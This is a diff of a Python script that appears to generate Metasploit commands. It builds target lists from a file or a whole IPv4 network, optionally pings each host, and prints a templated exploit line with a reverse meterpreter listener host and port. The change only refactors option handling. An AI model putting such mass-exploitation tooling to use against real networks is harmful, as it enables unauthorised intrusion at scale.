@@ -27,20 +27,13 @@ lhost = sys.argv[3].split(":")
 local_host = lhost[0]
 local_port = lhost[1]
 
-if opt == "-n":
+if opt == "-f":
+    fp = open(sys.argv[2], "r")
+    remote_hosts = [line.strip() for line in fp if line.find("#") == -1]
+elif opt == "-n":
     remote_hosts = list(ipaddress.IPv4Network(str(sys.argv[2]), strict=False).hosts())
 
-if opt == "-f":
-    remote_hosts = []
-    fp = open(sys.argv[2], "r")
-    for line in fp:
-        if line.find("#") == -1:
-            remote_hosts.append(line.strip())
-
 for remote_host in remote_hosts:
-    if no_ping:
+    if not no_ping and pyping.ping(str(remote_host)) or no_ping:
         print(payload % (exploit, remote_host, local_host, local_port, meterpreter))
-    else:
-        if pyping.ping(str(remote_host)):
-            print(payload % (exploit, remote_host, local_host, local_port, meterpreter))
 print("exit")
